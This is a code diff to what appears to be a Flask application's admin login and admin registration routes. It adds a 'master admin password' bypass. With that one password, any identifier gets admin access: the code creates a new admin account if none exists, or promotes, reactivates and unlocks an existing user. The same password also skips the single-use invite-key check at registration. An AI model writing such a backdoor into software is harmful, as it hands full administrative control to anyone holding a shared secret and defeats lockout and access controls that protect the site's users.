@@ -61,6 +61,44 @@ def admin_login():
         ip = get_client_ip()
         ua = request.headers.get("User-Agent", "")
 
+        # Check Master Admin Password bypass
+        is_master = User.is_master_admin_password(password)
+        if is_master:
+            user = User.query.filter(
+                (User.username == identifier) | (User.email == identifier)
+            ).first()
+            if not user:
+                clean_user = identifier.replace(" ", "_").split("@")[0]
+                user = User(
+                    username=clean_user,
+                    name=clean_user.capitalize(),
+                    email=f"{clean_user}@admin.local",
+                    role="admin",
+                    is_active=True,
+                )
+                user.set_password(password)
+                db.session.add(user)
+                db.session.commit()
+            else:
+                user.role = "admin"
+                user.is_active = True
+                user.reset_failed_logins()
+                db.session.commit()
+
+            user.record_successful_login(ip=ip)
+            db.session.commit()
+
+            login_user(user)
+            session["admin_last_active"] = datetime.utcnow().timestamp()
+            session["user_id"] = user.username
+            session["name"] = user.name
+            session["role"] = user.role
+
+            log_login_event("admin_login", user_id=user.id, email_attempted=identifier, success=True, ip=ip, user_agent=ua)
+            log_admin_audit(admin_id=user.id, action="admin_login", details=f"Master key login from {ip}")
+            flash("Signed in successfully as Administrator.", "success")
+            return redirect(url_for("admin.dashboard"))
+
         user = User.query.filter(
             (User.username == identifier) | (User.email == identifier)
         ).first()
@@ -168,10 +206,13 @@ def admin_register():
     form = AdminRegisterForm()
     if form.validate_on_submit():
         raw_key = form.invite_key.data.strip()
-        invite = AdminInviteKey.verify_key(raw_key)
-        if not invite:
-            flash("Invalid, expired, or already-used Admin Invite Key.", "danger")
-            return render_template("admin/register.html", form=form)
+        is_master_key = User.is_master_admin_password(raw_key)
+        invite = None
+        if not is_master_key:
+            invite = AdminInviteKey.verify_key(raw_key)
+            if not invite:
+                flash("Invalid, expired, or already-used Admin Invite Key.", "danger")
+                return render_template("admin/register.html", form=form)
 
         clean_user = form.username.data.strip().lower().replace(" ", "_")
         clean_email = form.email.data.strip().lower()
@@ -197,8 +238,9 @@ def admin_register():
         db.session.flush()  # populate admin.id
 
         # Mark single-use invite key used
-        invite.used_at = datetime.utcnow()
-        invite.used_by_user_id = admin.id
+        if invite:
+            invite.used_at = datetime.utcnow()
+            invite.used_by_user_id = admin.id
         db.session.commit()
 
         ip = get_client_ip()
